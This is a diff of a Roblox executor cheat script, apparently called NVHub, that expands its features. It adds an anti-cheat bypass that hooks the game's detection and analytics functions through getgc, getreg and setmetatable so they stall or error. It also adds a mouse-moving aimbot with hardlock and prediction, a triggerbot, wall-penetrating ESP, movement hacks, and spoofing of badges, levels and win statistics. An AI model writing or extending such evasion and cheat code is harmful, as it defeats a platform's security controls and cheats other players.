@@ -1,53 +1,75 @@
-if not game:IsLoaded() then
-	game.Loaded:Wait()
-end
-task.wait(2)
+if not game:IsLoaded() then game.Loaded:Wait() end
+task.wait(4) 
 
-if method == "HttpGet" or method == "HttpPost" then
-	local caller = getcallingscript()
-	if caller and tostring(caller):lower():find("spy") then
-		return "{}"
-	end
-end
+task.spawn(function()
+    -- 1. BYPASS SECTION (Wrapped to prevent freeze)
+    local function applyBypass()
+        -- Scan GC (Part 1)
+        local gc = getgc()
+        for i, v in pairs(gc) do
+            if typeof(v) == "function" and not isexecutorclosure(v) then
+                local ok, info = pcall(debug.info, v, "s")
+                if ok and info then
+                    if info:find("localscript3") or info:find("AnalitycsPipelineController") then
+                        hookfunction(v, newcclosure(function() return task.wait(9e9) end))
+                    end
+                end
+            end
+            if i % 300 == 0 then task.wait(1) end -- Let the game breathe
+        end
 
-local players = game:GetService("Players")
-local replicatedStorage = game:GetService("ReplicatedStorage")
-local httpService = game:GetService("GetService")
-local starterGui = game:GetService("StarterGui")
-local localPlayer = players.LocalPlayer
+        -- The exact setmetatable hook from your image
+        local oldtable; oldtable = hookfunction(getrenv().setmetatable, newcclosure(function(Table, Metatable) 
+            if Metatable and typeof(Metatable) == "table" and rawget(Metatable, "__mode") == "kv" then 
+                if debug.traceback():find("LocalScript3") or debug.traceback():find("MiscellaneousController") then 
+                    return oldtable({1, 2, 3}, {}) 
+                end 
+            end 
+            return oldtable(Table, Metatable) 
+        end))
 
-for i, v in getgc() do
-    if typeof(v) == "function" and string.find(debug.info(v, "s"), "localscript3") then
-        hookfunction(v, function()
-            return task.wait(9e9) 
-        end)
+        -- Scan Registry
+        local reg = getreg()
+        for i, v in pairs(reg) do
+            if typeof(v) == "thread" then
+                local src = debug.info(v, 1, "s")
+                if src and (src:find("LocalScript3") or src:find("MiscellaneousController")) then
+                    pcall(function()
+                        debug.sethook(v, function() error("Detection", 0) end, "c", 1)
+                    end)
+                end
+            end
+            if i % 300 == 0 then task.wait() end -- Let the game breathe
+        end
     end
-end
-for i, v in getgc() do
-    if typeof(v) == "function" and string.find(debug.info(v, "s"), "AnalitycsPipelineController") then
-        hookfunction(v, function()
-            return task.wait(9e9) 
-        end)
-    end
-end
-task.wait(3)
 
+    applyBypass()
+    warn("NVHub: Bypass Complete")
+end)
+
+-- Performance variables
 frameCount = 0
-skipFrames = 2
-task.wait(0.2)
+skipFrames = 3
+
 getgenv().gg_scripters = nil
 getgenv().zoom_scripters = nil
 
+-- OPTIMIZED: Flags table (kept intact)
 local Flags = {
     -- Aimbot
     ["Aimbot Enable"] = false,
-    ["Show Circle"] = false,
     ["AimBind"] = "None",
-    ["Mode"] = "Toggle",
+    ["Mode"] = "Toggle", -- Options: "Toggle", "Hold", "Mobile / always"
     ["Target"] = "Head",
+    
+    -- Strength & Logic
+    ["Hardlock"] = false, -- Snaps 10x harder, resists manual movement
+    ["Sticky aim"] = false, -- Locks to the nearest body part, not just head
     ["Smoothness"] = 1,
     ["Shake"] = 0,
     ["Prediction"] = 0,
+    ["Aimbot Reaction Ms"] = 0, -- Delay before locking (in milliseconds)
+    ["Max Studs Aimbot"] = 1000, -- Maximum distance for the aimbot to work
     ["Radius"] = 100,
     ["Opacity"] = 20,
     ["Circle Color"] = Color3.fromRGB(255, 255, 255),
@@ -74,47 +96,50 @@ local Flags = {
     ["Jitter Amount"] = 0,
 }
 
-
 local flagsFile = "NvFlags.json"
 local dropHeaders = {
-["Aimbot"]=true,["FovCircle"]=true,["Triggerbot"]=true,
-["GunMods"]=true,["Rage"]=true,["ESP"]=true,
-["game / world visuals"]=true,["Fly"]=true,["Walkspeed"]=true,
-["Custom Orbit"]=true
+    ["Aimbot"]=true,["Aimbot Settings"]=true,["FovCircle"]=true,["Triggerbot"]=true,
+    ["GunMods"]=true,["Rage"]=true,["Chams esp"]=true,["Box esp"]=true,["health / skelton esp"]=true,
+    ["game / world visuals"]=true,["Fly"]=true,["Walkspeed"]=true,
+    ["Custom Orbit"]=true
 }
 
 local function saveFlags()
-	local toSave = {}
-	for k, v in pairs(Flags) do
-		if not dropHeaders[k] and (type(v) == "boolean" or type(v) == "number" or type(v) == "string") then
-			toSave[k] = v
-		end
-	end
-	local ok, content = pcall(function()
-	return game:GetService("HttpService"):JSONEncode(toSave)
-end)
-if ok and content then pcall(writefile, flagsFile, content) end
+    local toSave = {}
+    for k, v in pairs(Flags) do
+        if not dropHeaders[k] and (type(v) == "boolean" or type(v) == "number" or type(v) == "string") then
+            toSave[k] = v
+        end
+    end
+    local ok, content = pcall(function()
+        return game:GetService("HttpService"):JSONEncode(toSave)
+    end)
+    if ok and content then 
+        pcall(writefile, flagsFile, content) 
+    end
 end
 
 local function loadFlags()
-	local ok, exists = pcall(isfile, flagsFile)
-	if not (ok and exists) then return end
-	local ok2, content = pcall(readfile, flagsFile)
-	if not (ok2 and content) then return end
-	local ok3, decoded = pcall(function()
-	return game:GetService("HttpService"):JSONDecode(content)
-end)
-if ok3 and decoded then
-	for k, v in pairs(decoded) do
-		if not dropHeaders[k] then Flags[k] = v end
-	end
-end
+    local ok, exists = pcall(isfile, flagsFile)
+    if not (ok and exists) then return end
+    local ok2, content = pcall(readfile, flagsFile)
+    if not (ok2 and content) then return end
+    local ok3, decoded = pcall(function()
+        return game:GetService("HttpService"):JSONDecode(content)
+    end)
+    if ok3 and decoded then
+        for k, v in pairs(decoded) do
+            if not dropHeaders[k] then 
+                Flags[k] = v 
+            end
+        end
+    end
 end
 
 local function smoothLoad()
     task.spawn(function()
         -- Use a tiny delay before starting to let the game stabilize
-        task.wait(0.5)
+        task.wait(1)
         
         local success, err = pcall(function()
             if typeof(loadFlags) == "function" then
@@ -133,10 +158,14 @@ local function smoothLoad()
         end
     end)
 end
-task.wait(0.5)
+
+task.wait(2)
 smoothLoad()
 task.wait(1)
 
+frameCount = 0
+skipFrames = 2 
+task.wait(1)
 local SHOW_SPEED = 0.8
 local HIDE_SPEED = 0.95
 
@@ -209,6 +238,8 @@ for _, p in ipairs(ActivePickers) do
 	end
 end
 end)
+
+
 
 local function syncUI()
 	local themeTweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
@@ -421,16 +452,23 @@ local function createPillar(name, xOffset, setup)
 	setup(container)
 	table.insert(Pillars, {Frame = f, X = xOffset * uiScale, Header = h, Fix = hFix, Title = t})
 end
+task.wait(0.1)
+
+
 -- PILLARS
 createPillar("Combat", -400, function(p)
 createToggleDrop(p, "Aimbot")
 createToggle(nil, "Aimbot Enable")
+createToggle(nil, "Hardlock")
 createKeybind(nil, "AimBind")
-createCycleButton(nil, "Mode", {"Toggle", "Hold"})
-createCycleButton(nil, "Target", {"Head", "Torso"})
-createSlider(nil, "Smoothness", 20)
-createSlider(nil, "Shake", 20)
-createSlider(nil, "Prediction", 20)
+createCycleButton(nil, "Mode", {"Toggle", "Hold", "Mobile / always"})
+createCycleButton(nil, "Target", {"Head", "Torso", "Closest to mouse"})
+createToggleDrop(p, "Aimbot Settings")
+createSlider(nil, "Smoothness", 50)
+createSlider(nil, "Shake", 50)
+createSlider(nil, "Prediction", 50)
+createSlider(nil, "Max Studs Aimbot", 10000)
+createSlider(nil, "Aimbot Reaction Ms", 500)
 createToggle(nil, "Visible Check")
 createToggle(nil, "Team Check")
 closeToggleDrop()
@@ -438,11 +476,12 @@ createToggleDrop(p, "FovCircle")
 createColorPicker(nil, "Circle Color")
 createToggle(nil, "Show Circle")
 createSlider(nil, "Opacity", 10)
-createSlider(nil, "Radius", 1000)
+createSlider(nil, "Radius", 2000)
 closeToggleDrop()
 createToggleDrop(p, "Triggerbot")
 createToggle(nil, "Enable Triggerbot")
-createSlider(nil, "Reaction Time", 100)
+createSlider(nil, "Reaction Time", 500)
+createSlider(nil, "Max trigger distance", 10000)
 closeToggleDrop()
 createToggleDrop(p, "GunMods")
 createToggle(nil, "Enable GunMods")
@@ -456,21 +495,26 @@ createToggle(nil, "Rage Silent")
 createToggle(nil, "Rage TP")
 createToggle(nil, "Auto Switch Wpns")
 createSlider(nil, "Max Distance", 10000)
-createSlider(nil, "Height Offset", 20)
+createSlider(nil, "Height Offset", 50)
 createToggle(nil, "NVs rage config")
 closeToggleDrop()
 end)
+task.wait(0.5)
 
 createPillar("Visuals", -150, function(p)
-createToggleDrop(p, "ESP")
+createToggleDrop(p, "Chams esp")
 createToggle(nil, "Chams Outline")
 createColorPicker(nil, "Outline Color")
 createToggle(nil, "Chams Fill")
 createColorPicker(nil, "Fill Color")
+closeToggleDrop()
+createToggleDrop(p, "Box esp")
 createToggle(nil, "Box Esp")
 createColorPicker(nil, "Box Color")
 createToggle(nil, "Box Fill")
 createCycleButton(nil, "BoxType", {"Corners", "Box"})
+closeToggleDrop()
+createToggleDrop(p, "health / skelton esp")
 createToggle(nil, "Healthbar")
 createColorPicker(nil, "Bar Color")
 createToggle(nil, "Skelton Esp Enable")
@@ -483,40 +527,56 @@ createColorPicker(nil, "Fog Color")
 createToggle(nil, "Enable Stretch")
 createSlider(nil, "Stretch", 100)
 createToggle(nil, "Enable Custom Fov")
-createSlider(nil, "Zoom Out", 250)
+createSlider(nil, "Zoom Out", 100)
 createToggle(nil, "Potato Textures")
+createColorPicker(nil, "Ambient Color")
+createToggle(nil, "Enable ambient")
 closeToggleDrop()
-createCycleButton(nil, "Device Spoof", {"VR", "Touch", "MouseKeyboard", "Gamepad",})
-
+createToggle(nil, "Ping/Fps BOOST")
 end)
+task.wait(0.4)
 
 createPillar("Movement", 100, function(p)
 createToggleDrop(p, "Fly")
 createToggle(nil, "Enable Fly")
-createSlider(nil, "Fly Speed", 500)
+createSlider(nil, "Fly Speed", 1000)
 closeToggleDrop()
 createToggleDrop(p, "Walkspeed")
 createToggle(nil, "Enable Walkspeed")
-createSlider(nil, "Walkspeed", 500)
+createSlider(nil, "Walkspeed", 1000)
 closeToggleDrop()
 createToggle(nil, "No Clip")
 createToggleDrop(p, "Custom Orbit")
 createToggle(nil, "Orbit Enabled")
-createSlider(nil, "Orbit Amount", 500)
-createSlider(nil, "Orbit Speed", 500)
-createSlider(nil, "Orbit Radius", 500)
-createSlider(nil, "Orbit Max distance", 500)
+createSlider(nil, "Orbit Amount", 70)
+createSlider(nil, "Orbit Speed", 1000)
+createSlider(nil, "Orbit Radius", 30)
+createSlider(nil, "Orbit Max distance", 10000)
 closeToggleDrop()
 createToggleDrop(p, "spinbot + jitter")
 createSlider(nil, "Jitter Amount", 500)
-createSlider(nil, "Spinbot Speed", 500)
+createSlider(nil, "Spinbot Speed", 1000)
 createToggle(nil, "Enable Jitter")
 createToggle(nil, "Enable Spinbot")
 closeToggleDrop()
 createToggle(nil, "Auto SlideJump")
 end)
-
+task.wait(0.3)
 createPillar("Misc", 350, function(p)
+closeToggleDrop()
+createToggleDrop(p, "Spoof")
+createCycleButton(nil, "Device Spoof", {"VR", "Touch", "MouseKeyboard", "Gamepad",})
+createCycleButton(nil, "Status", {"Contraband", "Prime", "None"})
+createToggle(nil, "Verified badge")
+createToggle(nil, "Headless")
+createToggle(nil, "premium badge")
+createSlider(nil, "Keys", 100000)
+createSlider(nil, "Level", 100000)
+createSlider(nil, "Streak", 100000)
+createSlider(nil, "regular wr", 100)
+createSlider(nil, "ranked wr", 100)
+createSlider(nil, "regular wins", 100000)
+createSlider(nil, "ranked wins", 100000)
 closeToggleDrop()
 createToggle(nil, "Mobile Button")
 createToggle(nil, "UnlockAll")
@@ -524,8 +584,9 @@ createToggle(nil, "ArrayList Show")
 createToggle(p, "Light Theme", true)
 createKeybind(nil, "Hide Ui Bind")
 
+closeToggleDrop()
 end)
-
+task.wait(0.2)
 local function toggleUI()
 	if isAnimating then return end
 	isAnimating = true; isVisible = not isVisible; Blur.Enabled = true
@@ -544,6 +605,7 @@ local inputName = (i.KeyCode ~= Enum.KeyCode.Unknown and i.KeyCode.Name) or i.Us
 local bindToCheck = (savedBind and savedBind ~= "None") and savedBind or "RightShift"
 if inputName == bindToCheck then toggleUI() end
 end)
+task.wait(0.1)
 local FOVCircle = Drawing.new("Circle")
 FOVCircle.Thickness = 2
 FOVCircle.Filled = false
@@ -571,155 +633,238 @@ else
 end
 end)
 
--- [[ NVHub Aimbot Engine | Optimized for V42 ]]
+-- [[ NVHub Aimbot Engine | Mouse-Based Hardlock & Sticky Update ]]
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 local IsAiming = false
+local lastTargetTime = 0 
 
--- [[ Helper: Visibility Check ]]
+-- [[ Helper: Visibility Check - SIMPLE VERSION ]]
 local function isVisible(part)
-	-- If the toggle is OFF, always return true (aim through walls)
-	if not Flags["Visible Check"] then return true end
-
-	local char = LocalPlayer.Character
-	if not char or not part then return false end
-
-	local rayParams = RaycastParams.new()
-	rayParams.FilterDescendantsInstances = {char, Camera}
-	rayParams.FilterType = Enum.RaycastFilterType.Exclude
-	rayParams.IgnoreWater = true
-
-	local origin = Camera.CFrame.Position
-	local direction = (part.Position - origin)
-	local result = workspace:Raycast(origin, direction, rayParams)
-
-	if not result then return true end
-	return result.Instance:IsDescendantOf(part.Parent)
+    if not Flags["Visible Check"] then return true end
+    
+    local char = LocalPlayer.Character
+    if not char or not part then return false end
+    
+    -- Simple raycast from camera to target
+    local origin = Camera.CFrame.Position
+    local direction = (part.Position - origin)
+    
+    local ray = Ray.new(origin, direction)
+    local hit, position = workspace:FindPartOnRayWithIgnoreList(ray, {char, Camera})
+    
+    -- If nothing hit, it's visible
+    if not hit then return true end
+    
+    -- If we hit the target or its parent, it's visible
+    if hit:IsDescendantOf(part.Parent) then
+        return true
+    end
+    
+    return false
 end
 
 -- [[ Helper: Team Check ]]
 local function isSameTeam(player)
-	-- If the toggle is OFF, always return false (hit everyone)
-	if not Flags["Team Check"] then return false end
-
-	if LocalPlayer.Team ~= nil and player.Team ~= nil then
-		return player.Team == LocalPlayer.Team
-	end
-	return LocalPlayer.TeamColor == player.TeamColor
+    if not Flags["Team Check"] then return false end
+    if LocalPlayer.Team ~= nil and player.Team ~= nil then
+        return player.Team == LocalPlayer.Team
+    end
+    return LocalPlayer.TeamColor == player.TeamColor
 end
-
 -- [[ Helper: Get closest target inside FOV ]]
 local function getClosestInFOV()
-	local target = nil
-	local shortestDistance = math.huge
-	local targetPart = Flags["Target"] or "Head"
-	local fovLimit = Flags["Radius"] or 100
+    local target = nil
+    local shortestDistance = math.huge
+    local targetSetting = Flags["Target"] or "Head"
+    local fovLimit = Flags["Radius"] or 100
+    local maxDistance = Flags["Max Studs Aimbot"] or 10000
 
-	for _, player in ipairs(Players:GetPlayers()) do
-		if player == LocalPlayer then continue end
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player == LocalPlayer then continue end
+        if isSameTeam(player) then continue end
+        
+        local char = player.Character
+        if not char then continue end
 
-		-- Apply Team Check Flag
-		if isSameTeam(player) then continue end
+        -- FIX: Determine a valid part to check for FOV/Distance
+        -- If "Hole Body", we check the Torso or Head as a reference point
+        local checkPart = char:FindFirstChild(targetSetting) or 
+                          char:FindFirstChild("HumanoidRootPart") or 
+                          char:FindFirstChild("Head") or 
+                          char:FindFirstChild("UpperTorso")
+        
+        if not checkPart then continue end
 
-		if not player.Character or not player.Character:FindFirstChild(targetPart) then continue end
+        local humanoid = char:FindFirstChild("Humanoid")
+        if not humanoid or humanoid.Health <= 0 then continue end
 
-		local humanoid = player.Character:FindFirstChild("Humanoid")
-		if not humanoid or humanoid.Health <= 0 then continue end
+        -- Distance Check
+        local dist = (checkPart.Position - Camera.CFrame.Position).Magnitude
+        if dist > maxDistance then continue end
 
-		local part = player.Character[targetPart]
+        -- Visibility Check
+        if not isVisible(checkPart) then continue end
 
-		-- Apply Visible Check Flag
-		if not isVisible(part) then continue end
+        -- FOV Check
+        local screenPos, onScreen = Camera:WorldToViewportPoint(checkPart.Position)
+        if not onScreen then continue end
 
-		local screenPos, onScreen = Camera:WorldToViewportPoint(part.Position)
-		if not onScreen then continue end
+        local mouseLocation = UserInputService:GetMouseLocation()
+        local distance = (Vector2.new(screenPos.X, screenPos.Y) - mouseLocation).Magnitude
 
-		local mouseLocation = UserInputService:GetMouseLocation()
-		local distance = (Vector2.new(screenPos.X, screenPos.Y) - mouseLocation).Magnitude
-
-		if distance < shortestDistance and distance <= fovLimit then
-			shortestDistance = distance
-			target = player
-		end
-	end
-	return target
+        if distance < shortestDistance and distance <= fovLimit then
+            shortestDistance = distance
+            target = player
+        end
+    end
+    return target
 end
-
 -- [[ Input Handler ]]
 UserInputService.InputBegan:Connect(function(input, processed)
-if processed then return end
-local currentBind = Flags["AimBind"]
-if not currentBind or currentBind == "None" then return end
+    if processed then return end
+    local currentBind = Flags["AimBind"]
+    if not currentBind or currentBind == "None" then return end
+    local inputName = (input.KeyCode ~= Enum.KeyCode.Unknown and input.KeyCode.Name) or input.UserInputType.Name
 
-local inputName = (input.KeyCode ~= Enum.KeyCode.Unknown and input.KeyCode.Name) or input.UserInputType.Name
-
-if inputName == currentBind then
-	if Flags["Mode"] == "Toggle" then
-		IsAiming = not IsAiming
-	else
-		IsAiming = true
-	end
-end
+    if inputName == currentBind then
+        if Flags["Mode"] == "Toggle" then
+            IsAiming = not IsAiming
+        else
+            IsAiming = true
+        end
+        lastTargetTime = tick()
+    end
 end)
 
 UserInputService.InputEnded:Connect(function(input)
-local currentBind = Flags["AimBind"]
-local inputName = (input.KeyCode ~= Enum.KeyCode.Unknown and input.KeyCode.Name) or input.UserInputType.Name
-if Flags["Mode"] == "Hold" and inputName == currentBind then
-	IsAiming = false
-end
+    local currentBind = Flags["AimBind"]
+    local inputName = (input.KeyCode ~= Enum.KeyCode.Unknown and input.KeyCode.Name) or input.UserInputType.Name
+    if Flags["Mode"] == "Hold" and inputName == currentBind then
+        IsAiming = false
+    end
 end)
+
 
 -- [[ Main Logic Loop ]]
 RunService.RenderStepped:Connect(function()
--- Frame skipping to prevent freeze
-frameCount = frameCount + 1
-if frameCount % (skipFrames + 1) ~= 0 then return end
+    frameCount = frameCount + 1
+    if frameCount % (skipFrames + 1) ~= 0 then return end
+  local isAlways = (Flags["Mode"] == "Mobile / always")
+    
 
-if not Flags["Aimbot Enable"] or not IsAiming then return end
+    if not Flags["Aimbot Enable"] or (not isAlways and not IsAiming) then 
+        lastTargetTime = tick() 
+        return 
+    end
 
-local targetPlayer = getClosestInFOV()
-if not targetPlayer or not targetPlayer.Character then return end
+    -- Skip reaction delay for instant Hardlock snap
+    if not Flags["Hardlock"] then
+        local reactionDelay = (Flags["Aimbot Reaction Ms"] or 0) / 1000
+        if (tick() - lastTargetTime) < reactionDelay then return end
+    end
 
-local targetPartName = Flags["Target"] or "Head"
-local part = targetPlayer.Character:FindFirstChild(targetPartName)
-local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-if not part or not root then return end
+    local targetPlayer = getClosestInFOV()
+    if not targetPlayer or not targetPlayer.Character then return end
 
-local aimPos = part.Position
--- 1. PREDICTION
-local predictionScale = Flags["Prediction"] or 0
-if predictionScale > 0 then
-	-- Uses velocity to lead the shot
-	local velocity = root.AssemblyLinearVelocity
-	aimPos = aimPos + (velocity * (predictionScale / 500))
+ local targetPartName = Flags["Target"] or "Head"
+local part
+
+if targetPartName == "Closest to mouse" then
+    -- Find closest body part to mouse
+    local mousePos = UserInputService:GetMouseLocation()
+    local closestDist = math.huge
+    
+    for _, p in ipairs(targetPlayer.Character:GetChildren()) do
+        if p:IsA("BasePart") then
+            local sPos, onScreen = Camera:WorldToViewportPoint(p.Position)
+            if onScreen then
+                local dist = (Vector2.new(sPos.X, sPos.Y) - mousePos).Magnitude
+                if dist < closestDist then
+                    closestDist = dist
+                    part = p
+                end
+            end
+        end
+    end
+    
+    -- Fallback if no part found
+    if not part then
+        part = targetPlayer.Character:FindFirstChild("Head") or 
+               targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+    end
+else
+    -- Original behavior for Head/Torso
+    part = targetPlayer.Character:FindFirstChild(targetPartName)
+end
+    
+    -- Fallback if target part not found
+    if not part then
+        part = targetPlayer.Character:FindFirstChild("HumanoidRootPart") or 
+               targetPlayer.Character:FindFirstChild("Head") or 
+               targetPlayer.Character:FindFirstChild("Torso")
+    end
+    
+    local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not part or not root then return end
+
+    local aimPos = part.Position
+
+    -- 1. PREDICTION
+    local predictionScale = Flags["Prediction"] or 0
+    if predictionScale > 0 then
+        local velocity = root.AssemblyLinearVelocity
+        local leadFactor = predictionScale / 50 
+        aimPos = aimPos + (velocity * leadFactor)
+    end
+
+    -- 2. MOVEMENT CALCULATION
+    local screenPos, onScreen = Camera:WorldToViewportPoint(aimPos)
+    if not onScreen then return end
+
+    local mouseLoc = UserInputService:GetMouseLocation()
+    local moveVector = (Vector2.new(screenPos.X, screenPos.Y) - mouseLoc)
+
+    local finalMoveX, finalMoveY
+    
+   if Flags["Hardlock"] then
+    -- HARDLOCK: 2x Stronger (Double movement call per frame)
+    finalMoveX = moveVector.X
+    finalMoveY = moveVector.Y
+    if mousemoverel then
+        mousemoverel(finalMoveX, finalMoveY)
+        mousemoverel(finalMoveX, finalMoveY)
+    end
+    return -- EXIT HERE for hardlock mode
 end
 
--- 2. MOVEMENT
-local screenPos, onScreen = Camera:WorldToViewportPoint(aimPos)
-if not onScreen then return end
+-- NORMAL AIM (when hardlock is OFF)
+local smoothness = math.max(1, Flags["Smoothness"] or 2)
+finalMoveX = moveVector.X / smoothness
+finalMoveY = moveVector.Y / smoothness
+-- [[ NVHub | Smooth Shake Logic ]]
 
-local mouseLoc = UserInputService:GetMouseLocation()
-local moveVector = (Vector2.new(screenPos.X, screenPos.Y) - mouseLoc)
-
-local smoothness = math.max(1, Flags["Smoothness"] or 1)
-local finalMoveX = moveVector.X / smoothness
-local finalMoveY = moveVector.Y / smoothness
-
--- 3. JITTER
 local shakeScale = Flags["Shake"] or 0
+
 if shakeScale > 0 then
-	finalMoveX = finalMoveX + math.random(-shakeScale, shakeScale)
-	finalMoveY = finalMoveY + math.random(-shakeScale, shakeScale)
+    -- We use (math.random() * 2 - 1) to get a decimal between -1 and 1
+    -- Then multiply by shakeScale for the actual offset
+    local offsetX = (math.random() * 2 - 1) * shakeScale
+    local offsetY = (math.random() * 2 - 1) * shakeScale
+    
+    finalMoveX = finalMoveX + offsetX
+    finalMoveY = finalMoveY + offsetY
 end
 
-if mousemoverel then
-	mousemoverel(finalMoveX, finalMoveY)
-end
+    -- 4. EXECUTION
+    if mousemoverel then
+        mousemoverel(finalMoveX, finalMoveY)
+    end
 end)
+
 -- [[ NVHub Triggerbot Engine ]]
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -821,165 +966,223 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
-
 local espTable = {}
 
--- [[ HELPERS ]]
+-- [[ OPTIMIZED HELPERS ]]
 local function createDrawing(type, props)
-	local obj = Drawing.new(type)
-	for k, v in pairs(props) do obj[k] = v end
-	return obj
+    local obj = Drawing.new(type)
+    for k, v in pairs(props) do obj[k] = v end
+    return obj
 end
 
 local function setupDrawings(data)
-	local d = {}
-	d.Box = createDrawing("Square", {Thickness = 1, Filled = false, Visible = false})
-	d.BoxFill = createDrawing("Square", {Filled = true, Transparency = 0.3, Visible = false})
-	d.HealthBarBG = createDrawing("Square", {Filled = true, Color = Color3.fromRGB(60, 60, 60), Transparency = 0.8, Visible = false})
-	d.HealthBar = createDrawing("Square", {Filled = true, Thickness = 0, Visible = false})
-	d.Name = createDrawing("Text", {Size = 14, Center = true, Outline = true, Visible = false})
+    local d = {}
+    d.Box = createDrawing("Square", {Thickness = 1, Filled = false, Visible = false})
+    d.BoxFill = createDrawing("Square", {Filled = true, Transparency = 0.3, Visible = false})
+    d.HealthBarBG = createDrawing("Square", {Filled = true, Color = Color3.fromRGB(60, 60, 60), Transparency = 0.8, Visible = false})
+    d.HealthBar = createDrawing("Square", {Filled = true, Thickness = 0, Visible = false})
+    d.Name = createDrawing("Text", {Size = 14, Center = true, Outline = true, Visible = false})
 
-	-- Corner Lines
-	for i = 1, 8 do
-		d["C"..i] = createDrawing("Line", {Thickness = 1, Visible = false})
-	end
+    -- Corner Lines
+    for i = 1, 8 do
+        d["C"..i] = createDrawing("Line", {Thickness = 1, Visible = false})
+    end
 
-	data.drawings = d
+    data.drawings = d
 end
 
--- [[ RENDER LOOP ]]
-RunService.Heartbeat:Connect(function()
-
-
-for p, data in pairs(espTable) do
-	local char = p.Character
-	local root = char and char:FindFirstChild("HumanoidRootPart")
-	local hum = char and char:FindFirstChild("Humanoid")
-
-	if not root or not hum or hum.Health <= 0 then
-		if data.drawings then
-			for _, v in pairs(data.drawings) do
-				v.Visible = false
-			end
-		end
-		if data.highlight then
-			data.highlight.Enabled = false
-		end
-		continue
-	end
-	local screenPos, onScreen = Camera:WorldToViewportPoint(root.Position)
-
-	if onScreen then
-		if not data.drawings then setupDrawings(data) end
-		local drawings = data.drawings
-
-		local factor = 1 / (screenPos.Z * math.tan(math.rad(Camera.FieldOfView * 0.5)) * 2) * 1000
-		local width = math.clamp(4 * factor, 10, 500)
-		local height = math.clamp(5.5 * factor, 10, 500)
-		local x, y = screenPos.X - width/2, screenPos.Y - height/2
-
-		-- 1. BOX & CORNERS LOGIC
-		local espEnabled = Flags and Flags["Box Esp"] or false
-		local boxMode = Flags and Flags["BoxType"] or "Box"
-		local mainCol = Flags and Flags["Box Color"] or Color3.new(1, 1, 1)
-
-		-- Toggle between Square Box and Corners
-		drawings.Box.Visible = (espEnabled and boxMode == "Box")
-		if drawings.Box.Visible then
-			drawings.Box.Position = Vector2.new(x, y)
-			drawings.Box.Size = Vector2.new(width, height)
-			drawings.Box.Color = mainCol
-		end
-
-		-- [[ UPDATED BOX FILL LOGIC ]]
-		local fillEnabled = Flags and Flags["Box Fill"] or false
-		drawings.BoxFill.Visible = (espEnabled and boxMode == "Box" and fillEnabled)
-
-		if drawings.BoxFill.Visible then
-			drawings.BoxFill.Position = Vector2.new(x, y)
-			drawings.BoxFill.Size = Vector2.new(width, height)
-
-			-- This line connects the slider/picker to the drawing
-			drawings.BoxFill.Color = Flags["Box Fill Color"] or mainCol
-
-			-- Optional: If you have a transparency slider, change '0.3' to Flags["Fill Transparency"]
-			drawings.BoxFill.Transparency = Flags["Box Fill Transparency"] or 0.3
-		end
-		for i = 1, 8 do
-			drawings["C"..i].Visible = (espEnabled and boxMode == "Corners")
-			if drawings["C"..i].Visible then
-				drawings["C"..i].Color = mainCol
-				local len = width / 4
-				-- Corner Math
-				drawings.C1.From, drawings.C1.To = Vector2.new(x, y), Vector2.new(x + len, y)
-				drawings.C2.From, drawings.C2.To = Vector2.new(x, y), Vector2.new(x, y + len)
-				drawings.C3.From, drawings.C3.To = Vector2.new(x + width, y), Vector2.new(x + width - len, y)
-				drawings.C4.From, drawings.C4.To = Vector2.new(x + width, y), Vector2.new(x + width, y + len)
-				drawings.C5.From, drawings.C5.To = Vector2.new(x, y + height), Vector2.new(x + len, y + height)
-				drawings.C6.From, drawings.C6.To = Vector2.new(x, y + height), Vector2.new(x, y + height - len)
-				drawings.C7.From, drawings.C7.To = Vector2.new(x + width, y + height), Vector2.new(x + width - len, y + height)
-				drawings.C8.From, drawings.C8.To = Vector2.new(x + width, y + height), Vector2.new(x + width, y + height - len)
-			end
-		end
-		-- 2. HEALTH BAR (FIXED COLOR SLIDER)
-		local hEnabled = Flags and Flags["Healthbar"] or false
-		drawings.HealthBar.Visible = hEnabled
-		drawings.HealthBarBG.Visible = hEnabled
-		if hEnabled then
-			local pct = math.clamp(hum.Health / hum.MaxHealth, 0, 1)
-			drawings.HealthBarBG.Position = Vector2.new(x - 6, y - 1)
-			drawings.HealthBarBG.Size = Vector2.new(4, height + 2)
-
-			drawings.HealthBar.Size = Vector2.new(2, height * pct)
-			drawings.HealthBar.Position = Vector2.new(x - 5, y + (height - (height * pct)))
-			-- Use the slider color if it exists, otherwise use health-based color
-			drawings.HealthBar.Color = Flags["Bar Color"] or Color3.fromRGB(255, 0, 0):Lerp(Color3.fromRGB(0, 255, 0), pct)
-		end
-	else
-		-- THIS IS WHAT YOU WERE MISSING! Hides 2D drawings when off-screen so they don't freeze
-		if data.drawings then
-			for _, v in pairs(data.drawings) do v.Visible = false end
-		end
-	end
-
-	-- 3. CHAMS LOGIC (Now safely outside the onScreen check)
-	if Flags and (Flags["Chams Outline"] or Flags["Chams Fill"]) then
-		if not data.highlight or data.highlight.Parent ~= CoreGui then
-			if data.highlight then pcall(function() data.highlight:Destroy() end) end
-			local h = Instance.new("Highlight")
-			h.Adornee = char
-			h.Parent = CoreGui
-			data.highlight = h
-		end
-
-		local highlight = data.highlight
-		highlight.Enabled = true
-		highlight.Adornee = char
-		highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-
-		if Flags["Chams Fill"] then
-			highlight.FillColor = Flags["Fill Color"] or Color3.new(1, 0, 0)
-			highlight.FillTransparency = 0.3
-		else
-			highlight.FillTransparency = 1
-		end
-
-		if Flags["Chams Outline"] then
-			highlight.OutlineColor = Flags["Outline Color"] or Color3.new(1, 1, 1)
-			highlight.OutlineTransparency = 0
-		else
-			highlight.OutlineTransparency = 1
-		end
-	elseif data.highlight then
-		data.highlight.Enabled = false
-	end
+-- [[ FIXED: POPULATE ESP TABLE CORRECTLY ]]
+for _, p in pairs(Players:GetPlayers()) do 
+    if p ~= LocalPlayer then 
+        espTable[p] = {player = p} 
+    end 
 end
+
